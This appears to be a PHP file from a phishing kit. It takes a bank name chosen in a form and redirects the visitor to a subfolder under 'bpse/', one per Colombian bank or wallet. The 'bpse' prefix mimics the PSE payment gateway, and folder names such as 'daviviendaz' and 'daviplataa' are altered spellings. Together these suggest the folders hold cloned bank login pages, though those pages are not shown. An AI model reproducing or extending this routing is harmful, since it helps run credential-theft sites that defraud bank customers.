<?php
$xop=$_POST['banco'];
switch ($xop){
    case "BANCO AV VILLA";
	header('Location: bpse/avvilla/');
    break;
    case "BANCO BBVA COLOMBIA S.A.";
	header('Location: bpse/bbva/');
    break;
    case "BANCO CAJA SOCIAL";
	header('Location: bpse/cajasocial/');
    break;
    case "DAVIVIENDA";
	header('Location: bpse/daviviendaz/');
    break;
    case "BANCO DE BOGOTA";
	header('Location: bpse/bogota/');
    break;
    case "BANCO DE OCCIDENTE";
	header('Location: bpse/occidente/');
    break;
    case "BANCO POPULAR";
	header('Location: bpse/popular/');
    break;
    case "DAVIPLATA";
	header('Location: bpse/daviplataa/');
    break;
    case "SCOTIABANK COLPATRIA";
	header('Location: bpse/colpatria/');
    break;
	case "BANCOLOMBIA";
	header('Location: bpse/bancolombia/');
    break;
	case "FALABELLA";
	header('Location: bpse/falabellaco/');
    break;
	case "BANCO ITAU";
    header('Location: bpse/itau/');
    break;
	default:$link="#";
	
}

?>
